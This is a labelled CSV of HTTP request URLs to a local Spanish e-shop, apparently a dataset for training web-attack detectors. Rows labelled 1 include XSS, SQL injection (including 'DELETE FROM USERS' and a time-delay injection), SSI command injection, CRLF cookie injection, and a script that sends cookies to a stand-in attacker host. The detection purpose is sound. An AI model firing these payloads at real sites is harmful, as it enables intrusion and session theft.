URL,Target
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tine&pwd=v%E1L70am4390any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shirai&pwd=3897r%24314m78t8&rememberA=off&B1=Entrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=poliwoda&password=enigmatista&nombre=Tarciano&apellidos=Cam%ED+Tordera&email=nardo%40codwatw.lk&dni=08762650H&direccion=Federico+Landrove+Moi%F1o+105+3-G&ciudad=Goizueta&cp=19360&provincia=Alicanteparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&ntc=7171983347621063&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shigeki&pwd=%2Fal%27op%E1tico&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=salyer&password=a814Pe5l6do&nombre=Gary&apellidos=Echaves+Marrero&email=zabczynski%40touringa.dj&dniA=18665206Q&direccion=Balcon+De+Granada%2C+22+&ciudad=Cueva+de+%C1greda&cp=15957&provincia=Ja%E9n&ntc=9940406513389702&B1=Registrar ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bnrecad&password=iN%21solUBLe&nombre=Aurelio%3F&apellidos=Ospina+Soma&email=humbert%4024htranslations.name&dni=78151636M&direccion=Ramat%2C+145+5%3FB&ciudad=Barbastro&cp=31227&provincia=Valladolid&ntc=5175468282615613&B1=Registrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080.Old ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080.old ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/imagenes.OLD ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=lawther&pwd=granoto&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=detleff3&pwd=tes6a485n&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=20&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&loginA=cis_w&password=H3RetiCal&nombre=Alcia&apellidos=Escarr%E9+Adrover&email=malik%40clubdeviaje.so&dni=61530852X&direccion=San+Jose+32%2C+&ciudad=Arano&cp=31579&provincia=Navarra&ntc=8422181884729126&B1=Registrar ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=devore&password=subcierna&nombre=Agripino&apellidos=Verge+Unza&email=bucci%40quehaces.jobs&dni=60737010J&direccion=C%2F+Ignacio+Alvarez+Castelao+63%2C+&ciudad=Nieva+de+Cam.eros&cp=26585&provincia=Albacete&ntc=4362098450410564&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=elysha&password=i02tent0&nombre=Flavio&apellidos=Tatje+Sopesens&email=teuian_balbo%40manuelpaloma.ky&dni=21564232F&direccion=Fierro+66%2C+3%3FE&ciudad=Ca%F1averuelas&cp=22584&provincia=Huesca&ntc=7841490490898807&B1=Registrar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=76&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/servlet/HelloWorldServlet ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nagy4&password=1al6uiria&nombre=Zaquiel&apellidos=Cabarr%FAs+Zaf%F3n&email=strom.mahieuy4%40karldeux.ac&dni=63829565B&direccion=C%2F+La+Paloma%2C+32+12-A&ciudad=Rub%ED+de+Bracamonte&cp=18567&provincia=Girona&ntc=6820667917309161&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3013&B1=Confirmar ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/techniques/servlets/index.html ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6766&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=breglec&pwd=alEGr%D3n&remember=off&B1=Entrar%27INJECTED_PARAM ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=xiaojing&password=coNtRadiCha&nombre=Iara&apellidos=Noya+Driu&email=milton%40diagnosticoradiologico.asia&dni=97426856Y&direccion=C%2F+Fuente+Pista+De+Tenis%2C+164+&ciudad=Aliseda&cp=40560&provincia=Le%F3n&ntc=5798582876895008&B1=Registrar ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=350&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9115&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/4861362529278789730 ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&cantidad=71&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=allis&pwd=De47aducha&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%2500 ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+DELETE+FROM+USERS ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8305&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=60&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gedeon&password=megal%EDt%2C%27%2Cica&nombre=Yuray&apellidos=Montserrat+Pugeo&email=jose_digges%40blanquillos.aq&dni=45447133F&direccion=Carretera+De+Arcos%2C+174+&ciudad=Aldeavieja+de+Tormes&cp=46890&provincia=Madrid&ntc=2175163155221209&B1=Registrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2500 ,1
http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide ,1
http://localhost:8080/CFIDE/administrator/welcomestart.cfm ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=medeiros&password=r31u1tAMEnte&nombre=Francesca&apellidosA=Pallis%F3+Hoz&email=darbon%40enlanzarote.com.li&dni=28753815C&direccion=C%2F+Delicias+33+&ciudad=Ali%F3&cp=43400&provincia=Lleida&ntc=8543941291101641&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schafer&password=7lI7e37r06&nombre=Santos&apellidos=Ricciardiello+Ameller&email=kelz%40animationproject.be&dni=08841812Z&direccion=Passeig+Oreneta+23+8%3FG&ciudad=Huarte%2FUharte&cp=37488&provincia=C%E1ceres&ntc=7240523818698482&B1A=Registrar ,1
http://localhost:8080/tienda1/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cadtools&pwd=hirco&remember=on%2F&B1=Entrar ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/imagenes/logo.gif.java ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tamer&password=suto8i%2Ba&nombre=Maurino&apellidos=Mitjans&email=balzo%40onlinegratis.lv&dni=19804746K&direccion=Antonio+Ulloa+6+6%3FD&ciudad=Zorita+de+la+Frontera&cp=08759&provincia=Huesca&ntc=1181707541494323&B1=Registrar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=siana&password=GA%2BVaNza&nombre=Juana&apellidos=Quijano&email=folsom_talli%40esteticadayda.tel&dni=52943030C&direccion=Santa+Catalina+81+&ciudad=Pla+del+Pened%E8s%2C+El&cp=16646&provincia=Girona&ntc=8510133826812144&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5521&B1=Pasar+por+caja%2F ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shonuck&password=9r3h7la%FA8&nombre=Hortencia&apellidos=Ma%F1%E9+Moscoso&email=valadez%40gaudio.bj&dni=81703579N&direccion=Poligono+Amargacena+141+&ciudad=Hita&cp=06658&provincia=Barcelona&ntc=7343251905864691&B1=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=teruyuki&pwd=906c0rea&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=driedger&pwd=boquitorcida&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/global/estilos.css/4861362529278789730 ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=winnie&password=1ArZ5ElA&nombre=Pomponio&apellidos=Aboitiz+Monestel&email=mcnaughton%40queinvento.gg&dni=86852947W&direccion=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&ciudad=Foradada&cp=43411&provincia=Badajoz&ntc=4587587495208642&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vassilik&password=d0sc3r1AN76&nombre=Adelmo&apellidos=Capachero&email=dahl%40asyra.net&dni=02792246T&direccion=C%2F+Puentezuelas%2C+147%2C+4-B&ciudad=Longares&cp=05500&provincia=Zamora&ntcA=3608872648497278&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fickes&password=indiligencia&nombre=Victorico&apellidos=Novalbos+Illarraga&email=gottschlich_candy%40piaceredelivery.pk&dni=76156835V&direccion=C%2F+Ramos+Carrion%2C+S%2FN+2%3FH&ciudad=Campo+de+Mirra%2FCamp+de+Mirra%2C+el&cp=17467&provincia=Madrid&ntc=7774409448573763&B1=Registrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=palidwor&password=sati1f4ctori4&nombre=Iago&apellidos=Tordera+Savall&email=debever%40viajesparamujeres.es&dni=18914400M&direccion=C%2F+Eulogio+Serdan%2C+139+5A&ciudad=Monforte+de+la+Sierra&cp=10620&provincia=Navarra&ntc=1279843552348312&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jyuo&password=cuarter8da&nombre=Lindolfo&apellidos=Torterolo+Buix%F3&email=lippe-bubat4%40tradora.va&dni=08105727K&direccion=Camino+Del+Caliero%2C+75+&ciudad=Villargordo+del+Cabriel&cp=43470&provincia=Guadalajara&ntc=9428064689399075&B1=Registrar ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=takagi71&pwd=M%2Calag%2Fa%2C%D1a&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stavro&password=BEbeDIZo&nombre=Alessandro&apellidos=Culubret+Lluss%E0&email=broaddus%40inversioneolica.eu&dni=75916349L&direccion=Pla%E7a+Del+Pi+Verd+84+10B&ciudad=Alcorisa&cp=19115&provincia=Lugo&ntc=4300788041091326&B1=Registrar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&pwd=cala%F1%E9s&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fayette&password=erECta&nombre=Katerina&apellidos=Moyano+Hasb%FAn&email=rosley-flakenstein%40alquivira.af&dni=91432847G&direccion=Napols+128%2C+4C&ciudad=Quintana+de+la+Serena&cp=18360&provincia=Ourense&ntc=6775628411457968paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Registrar ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eberto&password=micr6pil8&nombre=Soffia&apellidos=Pascuet+Landivar&email=comber%40barnicesultravioleta.kz&dni=30034324G&direccion=C%2F+Alfabia%2C+147%2C+&ciudad=Muelas+del+Pan&cp=25576&provincia=Barcelona&ntc=3946406903398216&B1=Registrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=82&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=aylmar6&pwd=ringle_ra&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modoA=registro&login=ochman&password=d5j8Dero&nombre=Erico&apellidos=Buscart&email=flavin%40opel-e-flex.kr&dni=20589158H&direccion=Passatge+Far%2C+90+8%3FE&ciudad=Santib%E1%F1ez+del+Val&cp=46330&provincia=Lleida&ntc=4447259758279371&B1=Registrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hiller&pwd=ofrecedor&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%4040 ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ermina&password=resello&nombre=Napole%F3n&apellidos=Serral+Torrell&email=livermore-kozlowski%40hiteurope.ws&dni=96622444L&direccion=Pau+Gargallo+120+8-B&ciudad=Consell&cp=02260&provincia=Guip%FAzcoa&ntc=6777741617227259&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/miembros/asf-logo-wide ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=eoin&password=H8bEr&nombre=Robertino&apellidos=Sintes+Novoa&email=rix.piljeckaja%40waterflyesp.be&dni=24604865V&direccion=C%2F+Barri+Del+Polvori%2C+77+&ciudad=Aldehuela+de+Yeltes&cp=05365&provincia=Guadalajara&ntc=9228046254742614&B1=Registrar ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
